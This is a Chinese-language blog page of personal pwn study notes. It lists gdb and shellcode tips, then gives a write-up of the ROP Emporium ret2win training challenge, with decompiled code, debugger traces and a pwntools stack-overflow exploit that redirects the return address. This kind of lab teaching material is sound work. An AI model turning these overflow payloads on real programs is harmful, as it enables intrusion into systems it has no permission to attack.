@@ -1,0 +1,562 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>pwn_new | faint-star</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="pwn">
+    <meta name="description" content="知识 查看内存分布 1cat /proc/pid/maps  一般程序每次运行时，全局变量的地址不会变，栈和堆段的地址会变  eip：当前程序执行到哪一行  ipython计算padding长度  /dev/null（垃圾堆） 1r &amp;lt; in &amp;gt; /dev/null  ltrace查看程序执行了哪些函数，执行了system只是缺少返回地址也就是栈帧平衡 1perl -e &amp;apos;p">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn_new">
+<meta property="og:url" content="http://yoursite.com/2019/12/21/pwn-new/index.html">
+<meta property="og:site_name" content="faint-star">
+<meta property="og:description" content="知识 查看内存分布 1cat /proc/pid/maps  一般程序每次运行时，全局变量的地址不会变，栈和堆段的地址会变  eip：当前程序执行到哪一行  ipython计算padding长度  /dev/null（垃圾堆） 1r &amp;lt; in &amp;gt; /dev/null  ltrace查看程序执行了哪些函数，执行了system只是缺少返回地址也就是栈帧平衡 1perl -e &amp;apos;p">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://user-images.githubusercontent.com/42031559/71446713-50417700-2761-11ea-90d6-50dda8ef2fb7.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/42031559/71447056-29853f80-2765-11ea-9bc5-314b14600169.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/42031559/71447089-939de480-2765-11ea-8195-8f8f15559e00.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/42031559/71447219-e7f59400-2766-11ea-80d1-616c94a9d59c.png">
+<meta property="og:updated_time" content="2019-12-25T14:36:49.673Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="pwn_new">
+<meta name="twitter:description" content="知识 查看内存分布 1cat /proc/pid/maps  一般程序每次运行时，全局变量的地址不会变，栈和堆段的地址会变  eip：当前程序执行到哪一行  ipython计算padding长度  /dev/null（垃圾堆） 1r &amp;lt; in &amp;gt; /dev/null  ltrace查看程序执行了哪些函数，执行了system只是缺少返回地址也就是栈帧平衡 1perl -e &amp;apos;p">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/42031559/71446713-50417700-2761-11ea-90d6-50dda8ef2fb7.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="faint-star" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">faint-star</h5>
+          <a href="mailto:15348163872@163.com" title="15348163872@163.com" class="mail">15348163872@163.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/faint-star" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">pwn_new</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">pwn_new</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-12-21T12:40:56.000Z" itemprop="datePublished" class="page-time">
+  2019-12-21
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#知识"><span class="post-toc-number">1.</span> <span class="post-toc-text">知识</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ROP-Emporium"><span class="post-toc-number">2.</span> <span class="post-toc-text">ROP Emporium</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#ret2win"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">ret2win</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#ret2win-1"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">ret2win</span></a></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-pwn-new"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">pwn_new</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-12-21 20:40:56" datetime="2019-12-21T12:40:56.000Z"  itemprop="datePublished">2019-12-21</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><ul>
+<li><p>查看内存分布</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/pid/maps</span><br></pre></td></tr></table></figure>
+
+<p>一般程序每次运行时，全局变量的地址不会变，栈和堆段的地址会变</p>
+</li>
+<li><p>eip：当前程序执行到哪一行</p>
+</li>
+<li><p>ipython计算padding长度</p>
+</li>
+<li><p>/dev/null（垃圾堆）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r &lt; in &gt; /dev/null</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>ltrace查看程序执行了哪些函数，执行了system只是缺少返回地址也就是栈帧平衡</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &apos;print &quot;A&quot;x116,&quot;\x30\x86\x04\x08&quot;&apos; | ltrace ./vul</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>DEP：可以写的地方不能跑，可以跑的地方不能写</p>
+</li>
+<li><p>ASLR：每次执行的内存随机，无法预知地址</p>
+</li>
+<li><p>nc(v参数显示详细信息，k保持连接，l监听端口)</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -vc ./vul -kl 127.0.0.1 8888</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>ni要跟到函数里面取，si不跟到函数里边去</p>
+</li>
+<li><p>x查看给定地址的内存，10个内存单元，w4字节，x以16进制形式</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/10wx $esp</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>运行pidof vul没有进程，但是运行脚本后却有，nc语句只是监听端口，当有人连接上了才运行程序</p>
+</li>
+<li><p>调试操作</p>
+<p>gdb打开一个程序，此时可以下断点，attach到一个进程，这个是远程的，根据本地的源代码决定断点下在哪里。</p>
+</li>
+<li><p>检查指令是否得到执行</p>
+<p>无穷循环</p>
+<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\xeb\xfe</span><br></pre></td></tr></table></figure>
+
+<p>Illegal instruction</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\xff\xff\xff</span><br></pre></td></tr></table></figure>
+
+<p>如果只是一般的字符串崩溃后显示的是Segmentation fault</p>
+</li>
+<li><p>用来代替全局变量的地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/pid/maps</span><br></pre></td></tr></table></figure>
+
+<p>得到的地址一般从0x0804a000起，因为这个地方一般用来存全局变量，但是里面可能也会有些重要的数据，所以找靠后的地址</p>
+</li>
+<li><p>strace查看程序启用了哪些系统调用</p>
+</li>
+<li><p>0x80系统调用</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enhex(asm(<span class="string">'int 0x80'</span>))</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>shellcode截断问题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asm(&apos;mov eax,11\n int 0x80&apos;)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xor eax,eax</span><br><span class="line">mov al,11</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push 11</span><br><span class="line">pop eax</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h2 id="ROP-Emporium"><a href="#ROP-Emporium" class="headerlink" title="ROP Emporium"></a>ROP Emporium</h2><h3 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h3><ul>
+<li><p>分析</p>
+<p><img src="https://user-images.githubusercontent.com/42031559/71446713-50417700-2761-11ea-90d6-50dda8ef2fb7.png" alt="image">开启了NX，栈上数据不可执行</p>
+<p>用IDA查看一下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">pwnme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">"For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;\n"</span></span><br><span class="line">    <span class="string">"What could possibly go wrong?"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  <span class="keyword">return</span> fgets(&amp;s, <span class="number">50</span>, <span class="built_in">stdin</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>程序分配了32字节的空间，但fgets可以接收的数据大于这个值（读到<code>\n</code>、<code>n-1</code>个字符、文件末尾时结束），所以会造成栈溢出，我们的目的是查看<code>flag.txt</code></p>
+<p>IDA查看到程序里有现成的函数可以利用，虽然正常情况下，这个函数不会执行</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ret2win</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Thank you! Here's your flag:"</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/cat flag.txt"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>利用缓冲区溢出，覆盖原本的返回地址，让他跳到ret2win函数执行</p>
+<p>这里主要记录一下调试的细节</p>
+<p>首先下断点，我下在了<code>pwnme</code>函数结尾处（<code>0x08048658</code>），也就是程序接收我们的输入后就停下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:0804864E                 call    _fgets</span><br><span class="line">.text:08048653                 add     esp, 10h</span><br><span class="line">.text:08048656                 nop</span><br><span class="line">.text:08048657                 leave</span><br><span class="line">.text:08048658                 retn</span><br></pre></td></tr></table></figure>
+
+<p>gdb启动进程，下好断点</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">'./ret2win32'</span>)</span><br><span class="line">gdb.attach(r,<span class="string">'b *0x80485d4\n'</span>)</span><br><span class="line">payload = cyclic(<span class="number">100</span>)</span><br><span class="line">pause()</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>弹出gdb调试窗口后backtrace一下，可以看到已经执行到fgets了，进程已启动就跑到这里了，所以断点只能下在fgets的后面。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#0  0xf7ef7079 in __kernel_vsyscall ()</span><br><span class="line">#1  0xf7de0cd7 in __GI___libc_read (fd=0x0, buf=0x9ed2160, nbytes=0x1000)</span><br><span class="line">    at ../sysdeps/unix/sysv/linux/read.c:27</span><br><span class="line">#2  0xf7d6d188 in _IO_new_file_underflow (fp=&lt;optimized out&gt;) at fileops.c:531</span><br><span class="line">#3  0xf7d6e2ab in __GI__IO_default_uflow (fp=0xf7ed25c0 &lt;_IO_2_1_stdin_&gt;)</span><br><span class="line">    at genops.c:380</span><br><span class="line">#4  0xf7d61151 in __GI__IO_getline_info (fp=0xf7ed25c0 &lt;_IO_2_1_stdin_&gt;, </span><br><span class="line">    buf=&lt;optimized out&gt;, n=0x31, delim=0xa, extract_delim=0x1, eof=0x0)</span><br><span class="line">    at iogetline.c:60</span><br><span class="line">#5  0xf7d6129e in __GI__IO_getline (fp=0xf7ed25c0 &lt;_IO_2_1_stdin_&gt;, </span><br><span class="line">    buf=0xfffb6cd0 &quot;&quot;, n=0x31, delim=0xa, extract_delim=0x1) at iogetline.c:34</span><br><span class="line">#6  0xf7d6004c in _IO_fgets (buf=0xfffb6cd0 &quot;&quot;, n=0x32, </span><br><span class="line">    fp=0xf7ed25c0 &lt;_IO_2_1_stdin_&gt;) at iofgets.c:53</span><br><span class="line">#7  0x08048653 in pwnme ()</span><br><span class="line">#8  0x080485d9 in main ()</span><br><span class="line">#9  0xf7d12e81 in __libc_start_main (main=0x804857b &lt;main&gt;, argc=0x1, </span><br><span class="line">    argv=0xfffb6db4, init=0x8048690 &lt;__libc_csu_init&gt;, </span><br><span class="line">    fini=0x80486f0 &lt;__libc_csu_fini&gt;, rtld_fini=0xf7f079b0 &lt;_dl_fini&gt;, </span><br><span class="line">    stack_end=0xfffb6dac) at ../csu/libc-start.c:310</span><br><span class="line">#10 0x080484a1 in _start ()</span><br></pre></td></tr></table></figure>
+
+<p>然后gdb，continue一下，脚本pause一下发送数据，看到停在了ret指令处，此时栈顶的内容，存放的是即将返回的地址</p>
+<p><img src="https://user-images.githubusercontent.com/42031559/71447056-29853f80-2765-11ea-9bc5-314b14600169.png" alt="image"></p>
+<p>可以看到栈顶被覆盖成了<code>laaa</code>这4个字节</p>
+<p>我们用<code>ipython</code>计算一下</p>
+<p><img src="https://user-images.githubusercontent.com/42031559/71447089-939de480-2765-11ea-8195-8f8f15559e00.png" alt="image"></p>
+<p>也就是说我们输入44个字符后，接下来的4个字节会被当做函数的返回地址，所以我们将他覆盖成ret2win的地址即可</p>
+</li>
+<li><p>exploit</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">'./ret2win32'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r,'b *0x08048658')</span></span><br><span class="line"><span class="comment"># payload = cyclic(100)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">ret2win = <span class="number">0x08048659</span></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">44</span>+p32(ret2win)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>可以验证一下，下个断点在这里，看到返回地址确实被覆盖成了ret2win的地址</p>
+<p><img src="https://user-images.githubusercontent.com/42031559/71447219-e7f59400-2766-11ea-80d1-616c94a9d59c.png" alt="image"></p>
+</li>
+</ul>
+<h3 id="ret2win-1"><a href="#ret2win-1" class="headerlink" title="ret2win"></a>ret2win</h3><p>与前面一样不过是变成64位的了</p>
+<ul>
+<li></li>
+<li></li>
+</ul>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2019-12-25T14:36:49.673Z" itemprop="dateUpdated">2019-12-25 22:36:49</time>
+</span><br>
+
+
+        
+    </div>
+    
+    <footer>
+        <a href="http://yoursite.com">
+            <img src="/img/avatar.jpg" alt="faint-star">
+            faint-star
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2019/12/21/pwn-new/&title=《pwn_new》 — faint-star&pic=http://yoursite.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2019/12/21/pwn-new/&title=《pwn_new》 — faint-star&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/12/21/pwn-new/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《pwn_new》 — faint-star&url=http://yoursite.com/2019/12/21/pwn-new/&via=http://yoursite.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://yoursite.com/2019/12/21/pwn-new/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2020/02/07/c-primer/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">c++_primer</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2019/11/13/security/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">security</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>This blog is licensed under a <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>faint-star &copy; 2015 - 2020</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2019/12/21/pwn-new/&title=《pwn_new》 — faint-star&pic=http://yoursite.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2019/12/21/pwn-new/&title=《pwn_new》 — faint-star&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/12/21/pwn-new/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《pwn_new》 — faint-star&url=http://yoursite.com/2019/12/21/pwn-new/&via=http://yoursite.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://yoursite.com/2019/12/21/pwn-new/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=http://yoursite.com/2019/12/21/pwn-new/" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = 'faint-star';
+            clearTimeout(titleTime);
+        } else {
+            document.title = 'faint-star';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
